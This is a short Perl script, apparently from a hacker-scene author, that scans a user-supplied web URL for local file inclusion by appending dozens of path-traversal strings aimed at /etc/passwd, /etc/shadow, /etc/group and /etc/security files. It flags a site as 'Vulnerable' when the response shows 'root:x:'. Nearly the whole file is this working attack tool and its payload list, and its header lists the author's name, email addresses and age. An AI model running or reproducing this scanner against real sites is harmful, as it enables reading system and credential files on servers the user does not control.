#!/usr/bin/perl
#
#*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
#			LFI Scanner Full Version
#*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
#
#
#
#						Info :
#
#						Code : Perl
#						Contact : Bl4ck.Viper
#						Email : Bl4ck.Viper@Gmail.Com & Bl4ck.Viper@Yahoo.Com
#						Why : Just 4 Fun My Friend
#						Greet : All Azarbycan & Iranian HackerZ
#						Frist & Last Name : Fardin Allahverdinajand
#						From : Azarbycan (Yasasin Benim Ana Vatanim)
#						Age : 18 :D
#																
#
#						Description :
#
#						Local File Include (LFI) Scanner Full & Priv8 Version
#						license Linux & Windows
#
#*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

	use HTTP::Request;
	use LWP::UserAgent;
	
print "\t*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\n";
print "\t\t LFI Scanner Full & Priv8 Version\n";
print "\t\t\t Coded By Bl4ck.Viper\n";
print "\t\t\t Made In Azarbycan\n";
print "\t\t\t Version In English\n";
print "\t*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\n";
print "\n\n";


	print "\tPress [Enter] For Start Scanner ...";
	$esu=<>;
	print "\n\n";
	print "\t Insert Target (ex: http://www.site.com/index.php?page=)\n";
	print "\t Target :";
	$host=<STDIN>;
	chomp($host);
	if($host !~ /http:\/\//) { $host = "http://$host"; };

print "\n\n";
print "\t*-*-*-*-*-* WORKING IN PROGRESS *-*-*-*-*-*\n";
print "\n\n";
@lfi = ('../etc/passwd',
'../../etc/passwd',
'../../../etc/passwd',
'../../../../etc/passwd',
'../../../../../etc/passwd',
'../../../../../../etc/passwd',
'../../../../../../../etc/passwd',
'../../../../../../../../etc/passwd',
'../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../..etc/passwd',
'../etc/shadow',
'../../etc/shadow',
'../../../etc/shadow',
'../../../../etc/shadow',
'../../../../../etc/shadow',
'../../../../../../etc/shadow',
'../../../../../../../etc/shadow',
'../../../../../../../../etc/shadow',
'../../../../../../../../../etc/shadow',
'../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../../etc/shadow',
'../etc/group',
'../../etc/group',
'../../../etc/group',
'../../../../etc/group',
'../../../../../etc/group',
'../../../../../../etc/group',
'../../../../../../../etc/group',
'../../../../../../../../etc/group',
'../../../../../../../../../etc/group',
'../../../../../../../../../../etc/group',
'../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../../etc/group',
'../etc/security/group',
'../../etc/security/group',
'../../../etc/security/group',
'../../../../etc/security/group',
'../../../../../etc/security/group',
'../../../../../../etc/security/group',
'../../../../../../../etc/security/group',
'../../../../../../../../etc/security/group',
'../../../../../../../../../etc/security/group',
'../../../../../../../../../../etc/security/group',
'../../../../../../../../../../../etc/security/group',
'../etc/security/passwd',
'../../etc/security/passwd',
'../../../etc/security/passwd',
'../../../../etc/security/passwd',
'../../../../../etc/security/passwd',
'../../../../../../etc/security/passwd',
'../../../../../../../etc/security/passwd',
'../../../../../../../../etc/security/passwd',
'../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../../etc/security/passwd',
'../etc/security/user',
'../../etc/security/user',
'../../../etc/security/user',
'../../../../etc/security/user',
'../../../../../etc/security/user',
'../../../../../../etc/security/user',
'../../../../../../../etc/security/user',
'../../../../../../../../etc/security/user',
'../../../../../../../../../etc/security/user',
'../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../../etc/security/user');

foreach $scan(@lfi){

$url = $host.$scan;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($request);
if ($response->is_success && $response->content =~ /root:x:/) { $msg = Vulnerable;}
else { $msg = "Not Found";}
print "$scan..........[$msg]\n";
}

# Bl4ck.Viper Turkish Hacker
